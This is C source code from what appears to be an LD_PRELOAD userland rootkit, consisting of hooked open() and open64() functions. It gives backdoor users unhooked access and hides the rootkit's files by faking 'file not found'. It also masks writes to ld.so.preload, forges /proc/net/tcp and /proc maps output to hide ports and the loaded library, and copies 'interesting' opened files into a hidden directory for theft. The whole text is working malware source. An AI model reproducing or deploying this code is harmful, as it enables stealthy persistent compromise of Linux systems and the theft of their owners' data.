int open(const char *pathname, int flags, mode_t mode){
    hook(COPEN);
    if(is_bdusr()) return (long)call(COPEN, pathname, flags, mode);

#ifdef HIDE_SELF
    if(hidden_path(pathname) && xstrstr(LDSO_PRELOAD, pathname) &&
        ((xprocess(SH_PROC) || xprocess(BUSYBOX_PROC)) &&
        (flags == (64|1|512)))){
        int ret;
        xor(null_path, DEVNULL_PATH);
        ret = (long)call(COPEN, null_path, flags, mode);
        clean(null_path);
        return ret;
    }
#endif

    if(hidden_path(pathname)){
        errno = ENOENT;
        return -1;
    }

    /*  if a process tries opening certain files, we return back an fd to our own file.
     *  essentially we mirror the pre-existing file while making sure we omit any
     *  sensitive information we may not want others seeing.
     *  we can apply this to any file that a process may need to open. */

#ifdef HIDE_PORTS
    if(!xstrncmp(TCP_PATH, pathname) || !xstrncmp(TCP6_PATH, pathname))
        return fileno(forge_procnet(pathname));
#endif

#ifdef FORGE_MAPS
    if(!xfnmatch(MAPS_FULL_PATH, pathname)) return fileno(forge_maps(pathname));
    if(!xfnmatch(SMAPS_FULL_PATH, pathname)) return fileno(forge_smaps(pathname));
    if(!xfnmatch(NMAPS_FULL_PATH, pathname)) return fileno(forge_numamaps(pathname));

    char cwd[PATH_MAX];
    if(getcwd(cwd, sizeof(cwd)) != NULL){
        if(!xstrncmp(PROC_PATH, cwd)){
            if(!xfnmatch(MAPS_PROC_PATH, pathname)) return fileno(forge_maps(pathname));
            if(!xfnmatch(SMAPS_PROC_PATH, pathname)) return fileno(forge_smaps(pathname));
            if(!xfnmatch(NMAPS_PROC_PATH, pathname)) return fileno(forge_numamaps(pathname));
        }

        if(!xfnmatch(PROC_ALL_PATH, cwd)){
            if(!xfnmatch(MAPS_FILENAME, pathname)) return fileno(forge_maps(pathname));
            if(!xfnmatch(SMAPS_FILENAME, pathname)) return fileno(forge_smaps(pathname));
            if(!xfnmatch(NMAPS_FILENAME, pathname)) return fileno(forge_numamaps(pathname));
        }
    }
#endif

#ifdef FILE_STEAL
    /* we want to check if somebody is opening an 'interesting' file,
     * if they are, we want to essentially copy it to a hidden rootkit directory
     * for us to see. */
    inspect_file(pathname);
#endif
    return (long)call(COPEN, pathname, flags, mode);
}

int open64(const char *pathname, int flags, mode_t mode){
    hook(COPEN64);
    if(is_bdusr()) return (long)call(COPEN, pathname, flags, mode);

#ifdef HIDE_SELF
    if(hidden_path(pathname) && xstrstr(LDSO_PRELOAD, pathname) &&
        ((xprocess(SH_PROC) || xprocess(BUSYBOX_PROC)) &&
        (flags == (64|1|512)))){
        int ret;
        xor(null_path, DEVNULL_PATH);
        ret = (long)call(COPEN, null_path, flags, mode);
        clean(null_path);
        return ret;
    }
#endif

    if(hidden_path(pathname)){
        errno = ENOENT;
        return -1;
    }

#ifdef HIDE_PORTS
    if(!xstrncmp(TCP_PATH, pathname) || !xstrncmp(TCP6_PATH, pathname))
        return fileno(forge_procnet(pathname));
#endif

#ifdef FORGE_MAPS
    if(!xfnmatch(MAPS_FULL_PATH, pathname)) return fileno(forge_maps(pathname));
    if(!xfnmatch(SMAPS_FULL_PATH, pathname)) return fileno(forge_smaps(pathname));
    if(!xfnmatch(NMAPS_FULL_PATH, pathname)) return fileno(forge_numamaps(pathname));

    char cwd[PATH_MAX];
    if(getcwd(cwd, sizeof(cwd)) != NULL){
        if(!xstrncmp(PROC_PATH, cwd)){
            if(!xfnmatch(MAPS_PROC_PATH, pathname)) return fileno(forge_maps(pathname));
            if(!xfnmatch(SMAPS_PROC_PATH, pathname)) return fileno(forge_smaps(pathname));
            if(!xfnmatch(NMAPS_PROC_PATH, pathname)) return fileno(forge_numamaps(pathname));
        }

        if(!xfnmatch(PROC_ALL_PATH, cwd)){
            if(!xfnmatch(MAPS_FILENAME, pathname)) return fileno(forge_maps(pathname));
            if(!xfnmatch(SMAPS_FILENAME, pathname)) return fileno(forge_smaps(pathname));
            if(!xfnmatch(NMAPS_FILENAME, pathname)) return fileno(forge_numamaps(pathname));
        }
    }
#endif

#ifdef FILE_STEAL
    inspect_file(pathname);
#endif
    return (long)call(COPEN64, pathname, flags, mode);
}
